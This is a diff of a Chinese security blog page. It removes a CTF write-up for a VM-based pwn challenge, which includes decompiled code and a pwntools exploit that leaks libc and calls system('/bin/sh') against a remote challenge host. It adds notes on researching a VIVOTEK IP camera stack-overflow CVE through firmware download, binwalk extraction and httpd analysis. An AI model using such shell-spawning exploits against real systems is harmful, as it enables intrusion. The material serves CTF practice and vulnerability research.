@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="PVP GAME  粤湾证券, Tower">
+    <meta name="keywords" content="漏洞整理iot, Tower">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>PVP GAME  粤湾证券 | Tower</title>
+    <title>漏洞整理iot | Tower</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -308,12 +308,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">PVP GAME  粤湾证券</h1>
+                    <h1 class="description center-align post-title">漏洞整理iot</h1>
                 </div>
             </div>
         </div>
@@ -430,12 +430,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/ctf/">
-                                <span class="chip bg-color">ctf</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">漏洞</span>
                             </a>
                         
-                            <a href="/tags/wp/">
-                                <span class="chip bg-color">wp</span>
+                            <a href="/tags/iot/">
+                                <span class="chip bg-color">iot</span>
                             </a>
                         
                     </div>
@@ -446,8 +446,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/vmpwn/" class="post-category">
-                                vmpwn
+                            <a href="/categories/%E6%95%B4%E7%90%86/" class="post-category">
+                                整理
                             </a>
                         
                     </div>
@@ -459,28 +459,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-18
+                    2020-12-03
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-18
+                    2020-12-03
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    414
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -495,106 +495,68 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><pre class=" language-c"><code class="language-c">_QWORD <span class="token operator">*</span>__fastcall <span class="token function">sub_F7D</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">,</span> __int64 a4<span class="token punctuation">,</span> __int64 a5<span class="token punctuation">,</span> __int64 a6<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 opcode_val<span class="token punctuation">,</span> <span class="token keyword">char</span> op1_val<span class="token punctuation">,</span> __int64 op2_val<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  _QWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
-  <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v10<span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
-  <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v11<span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
-  <span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>v12<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
-
-  result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>opcode_val<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">==</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    ebp_addr<span class="token punctuation">[</span>esp_index_value<span class="token punctuation">]</span> <span class="token operator">=</span> op2_val<span class="token punctuation">;</span>
-    result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>esp_index_value<span class="token operator">++</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// push</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">></span> <span class="token number">0x10</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">==</span> <span class="token number">0x20</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-      <span class="token operator">--</span>esp_index_value<span class="token punctuation">;</span>
-      result <span class="token operator">=</span> ebp_addr<span class="token punctuation">;</span>
-      ebp_addr<span class="token punctuation">[</span>esp_index_value<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// push 0</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> opcode_val <span class="token operator">==</span> <span class="token number">0x40</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> esp_index_value <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>
-      <span class="token punctuation">{</span>
-        v10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">run_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        a2 <span class="token operator">=</span> ebp_addr<span class="token punctuation">[</span>esp_index_value <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-        <span class="token function">v10</span><span class="token punctuation">(</span>ebp_addr<span class="token punctuation">[</span>esp_index_value <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 运行函数，栈传参</span>
-      <span class="token punctuation">}</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> esp_index_value <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
-      <span class="token punctuation">{</span>
-        v11 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">run_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">v11</span><span class="token punctuation">(</span>ebp_addr<span class="token punctuation">[</span>esp_index_value <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token punctuation">}</span>
-      result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>esp_index_value<span class="token punctuation">;</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>esp_index_value <span class="token punctuation">)</span>
-      <span class="token punctuation">{</span>
-        v12 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">run_symbol</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        result <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">v12</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>op1_val<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
-<p>只有一个栈，栈传参，直接运行函数指令格式为opcode+op1+op2<br>但是读入的数据会进行一个base64解密</p>
-<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605681939785.png" alt="base64解密"></p>
-<p>pwn和加密算法结合起来</p>
-<p>exp也很简单</p>
-<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-file_path <span class="token operator">=</span> <span class="token string">"./pwn"</span>
-context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
-<span class="token keyword">import</span> base64
-
-<span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>
-
-debug <span class="token operator">=</span> <span class="token number">1</span>
-<span class="token keyword">if</span> debug<span class="token punctuation">:</span>
-    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
-    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>
-    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
-    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span>
-
-<span class="token keyword">else</span><span class="token punctuation">:</span>
-    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>
-    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
-    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span>
-
-<span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    debug_str <span class="token operator">=</span> <span class="token string">""</span>
-    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>
-        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
-        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
-    <span class="token keyword">else</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>
-            text_base<span class="token operator">=</span><span class="token number">0</span>
-            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">getCmd</span><span class="token punctuation">(</span>opcode<span class="token punctuation">,</span>op1<span class="token punctuation">,</span>op2<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> p64<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>op1<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>op2<span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">Push</span><span class="token punctuation">(</span>op2<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> getCmd<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>op2<span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">RunFunction</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>name<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-debug_1<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x0000000000000FA9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
-info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#12是64位libc地址的长度  16是64位canary的长度 (不算0x)</span>
-result<span class="token operator">=</span>int<span class="token punctuation">(</span>info<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak str to int : "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
-libc<span class="token punctuation">.</span>address<span class="token operator">=</span>result
-payload<span class="token operator">=</span>Push<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>Push<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>RunFunction<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
-
-p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"code:"</span><span class="token punctuation">,</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
-
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+                <h2 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h2><p>在cve list查找cemara（router也行，但是路由器通常是mips架构的）<br><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=camera">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=camera</a></p>
+<p>或者查找开源库</p>
+<h2 id="定位到感兴趣的条目"><a href="#定位到感兴趣的条目" class="headerlink" title="定位到感兴趣的条目"></a>定位到感兴趣的条目</h2><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606975606345.png" alt="感兴趣的条目"></p>
+<p>对它感兴趣是因为它的漏洞描述：固件为0x20x之前的VIVOTEK IP摄像机设备通过精心设计的HTTP标头具有基于堆栈的缓冲区溢出。</p>
+<ul>
+<li>影响范围比较广（固件可能容易获得，一次可以找到影响的固件比较多）</li>
+<li>栈溢出明显的二进制漏洞</li>
+</ul>
+<p>但是这个条目的解释非常少，我对这个条目进行搜索</p>
+<h2 id="搜索更多信息"><a href="#搜索更多信息" class="headerlink" title="搜索更多信息"></a>搜索更多信息</h2><p>最关键的有两个点：</p>
+<ul>
+<li>说明文档，对漏洞位置的说明</li>
+<li>固件下载，能够下载到固件并且能够解压</li>
+</ul>
+<p>接下来将会解决这两个问题</p>
+<h3 id="说明文档查找"><a href="#说明文档查找" class="headerlink" title="说明文档查找"></a>说明文档查找</h3><p>直接搜索cve编号或cve编号+“poc” 关键字</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976197899.png" alt="搜索方法"></p>
+<p>这里面很多都是对漏洞的报告，需要多打开几个</p>
+<p>我这里找到了一个报告多包含了一点信息</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976114478.png" alt="得到稍微多一点的信息"></p>
+<p>告诉了我关键漏洞函数位置以及cwe编号</p>
+<p>介绍：cwe是收集的漏洞类型，是对一个漏洞关键代码的摘要</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976396336.png" alt="cwe"></p>
+<p>从cwe可以帮助理解这是什么漏洞</p>
+<h3 id="固件下载和解压"><a href="#固件下载和解压" class="headerlink" title="固件下载和解压"></a>固件下载和解压</h3><p>可以从查找道德信息里面确定漏洞存在于那些版本的固件，从官网下载固件，有些分析文章会直接给出固件下载链接</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976577686.png" alt="固件版本"></p>
+<p>找到固件上面说0x20a以前的版本，就随便找之前的版本下载（字母尽量跟前面的VVTK匹配，匹配不了也没办法先下载一个试试）</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606976787784.png" alt="官网找到固件"></p>
+<p>下载之后查询签名并解压（一般是.bin文件但是有时候是其他后缀名）</p>
+<p><code>binwalk -Y AB6117-VVTK-0101f.flash.pkg</code><br>命令可以查询签名得到架构的信息（一般是x86，x86_64，i386，amd64，mips，arm）架构信息查不到无所谓</p>
+<p>然后解压<code>binwalk -Me AB6117-VVTK-0101f.flash.pkg</code>  解压完成会多出一个下划线开头的文件夹，可能内容很多也可能很少</p>
+<p>接下来要确定一些信息，解压是否成功，漏洞程序是哪一个</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606977157042.png" alt="查找命令"></p>
+<ul>
+<li>find 命令是递归输出指定目录下的所有文件、文件夹</li>
+<li>.表示目录（可以指定为要搜索的目录）</li>
+<li>|grep是用来过滤字符串的</li>
+<li>busybox就是要过滤的字符串，只输出包含busybox的字符串，其他的都不会输出</li>
+</ul>
+<p>上面的结果表示搜索到了busybox这个文件（或者文件夹）<br>busybox是嵌入式设备常用（基本上都要用）的工具，它里面集成了很多linux常用命令并且文件本身比较小。这里搜索到了这个文件说明解压成功了（也可以通过tree命令查看目录里面文件多少判断是否解压成功）</p>
+<p>还可以通过这个文件得到系统的架构</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>base<span class="token punctuation">)</span> ➜  _AB6117-VVTK-0101f.flash.pkg.extracted git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">file</span> ./_31.extracted/_rootfs.img.extracted/squashfs-root/bin/busybox
+./_31.extracted/_rootfs.img.extracted/squashfs-root/bin/busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+</code></pre>
+<p>file命令打印出了这个文件的架构是arm，LSB表示小段字节序，32-bit表示32位</p>
+<h2 id="分析漏洞"><a href="#分析漏洞" class="headerlink" title="分析漏洞"></a>分析漏洞</h2><h3 id="找到漏洞文件"><a href="#找到漏洞文件" class="headerlink" title="找到漏洞文件"></a>找到漏洞文件</h3><p>可以根据分析的文章找到具体是哪个文件。但是有时候没有给出是哪个文件</p>
+<p>一般是httpd文件(如果是http服务的漏洞)</p>
+<p>同样的方法可以查找到httpd所在的目录</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978141110.png" alt="httpd"></p>
+<h3 id="分析httpd文件"><a href="#分析httpd文件" class="headerlink" title="分析httpd文件"></a>分析httpd文件</h3><p>需要用到的工具：ghidra，ida安装包在硬盘里（漏洞收集目录）</p>
+<p>搜索漏洞函数定位</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978452382.png" alt="漏洞函数"></p>
+<p>本函数没有意义查找谁调用了这个函数</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978564442.png" alt="定位函数"></p>
+<p>发现只有一个地方调用了这个函数</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978601748.png" alt="向上"></p>
+<p>可以看出一些问题搜索了这些参数的含义可以知道这里三个参数只是限制日志等级进程之类的东西，没有限制字符串长度<br>这是我用c把这段代码摘出来做的测试</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978882585.png" alt="测试"></p>
+<p>对字符串的限制在上一层函数</p>
+<p>找到了很多函数，但是只有一个函数的参数是变量，这里应该是一个有漏洞的函数</p>
+<p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1606978967466.png" alt="继续查找上一层函数"></p>
+<p>但是需要动态调试来验证，比较麻烦先放在这里。（因为poc部分实在不行可以是一段文字描述）</p>
 
             </div>
             <hr/>
@@ -608,12 +570,12 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/ctf/">
-                                    <span class="chip bg-color">ctf</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">漏洞</span>
                                 </a>
                             
-                                <a href="/tags/wp/">
-                                    <span class="chip bg-color">wp</span>
+                                <a href="/tags/iot/">
+                                    <span class="chip bg-color">iot</span>
                                 </a>
                             
                         </div>
@@ -658,7 +620,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         repo: '',
         owner: '',
         admin: null,
-        id: '2020-11-18T14-39-38',
+        id: '2020-12-03T14-03-28',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -682,57 +644,54 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/11/18/vmpwn%E6%80%BB%E7%BB%93/">
+                <a href="/2020/12/03/%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86iot/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="vmpwn总结">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="漏洞整理iot">
                         
-                        <span class="card-title">vmpwn总结</span>
+                        <span class="card-title">漏洞整理iot</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            分析各种存储器格式初始化结构_DWORD *sub_8049570()
-{
-  _DWORD *v0; // eax
-  _DWORD *v1; // ST1C_4
-
-  v0 = malloc(0x2Cu);
-  v1 = v0;
-  *
+                            查找方法在cve list查找cemara（router也行，但是路由器通常是mips架构的）https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=camera
+或者查找开源库
+定位到感兴趣的条目
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-03
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%80%BB%E7%BB%93/" class="post-category">
-                                    总结
+                            <a href="/categories/%E6%95%B4%E7%90%86/" class="post-category">
+                                    整理
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
                     </a>
                     
-                    <a href="/tags/vmpwn/">
-                        <span class="chip bg-color">vmpwn</span>
+                    <a href="/tags/iot/">
+                        <span class="chip bg-color">iot</span>
                     </a>
                     
                 </div>
@@ -746,39 +705,32 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/11/14/%E7%B2%A4%E6%B9%BE%E9%93%B6%E8%A1%8C%20(vm2)%20/">
+                <a href="/2020/11/30/linux%E5%BA%93%E8%AF%B4%E6%98%8E%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="粤湾银行 (vm2)">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="linux库说明以及如何修改动态链接库">
                         
-                        <span class="card-title">粤湾银行 (vm2)</span>
+                        <span class="card-title">linux库说明以及如何修改动态链接库</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            结构分析ptr指针的结构
-_DWORD *sub_8049570()
-{
-  _DWORD *v0; // eax
-  _DWORD *v1; // ST1C_4
-
-  v0 = malloc(0x2Cu);
-  v1 = v0;
-  *v
+                            说明在ctf中共享库的问题一直是一个非常非常非常恶心的问题，这里将会介绍动态链接库的命名以及如何修改一个程序依赖的动态链接库
+命名0x7f387805e000     0x7f3878091000 r-xp    33000 0      
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-30
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/vmpwn/" class="post-category">
-                                    vmpwn
+                            <a href="/categories/%E6%95%B4%E7%90%86/" class="post-category">
+                                    整理
                                 </a>
                             
                             
@@ -788,12 +740,12 @@ _DWORD *sub_8049570()
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/%E4%BB%8B%E7%BB%8D/">
+                        <span class="chip bg-color">介绍</span>
                     </a>
                     
-                    <a href="/tags/wp/">
-                        <span class="chip bg-color">wp</span>
+                    <a href="/tags/%E7%8E%AF%E5%A2%83/">
+                        <span class="chip bg-color">环境</span>
                     </a>
                     
                 </div>
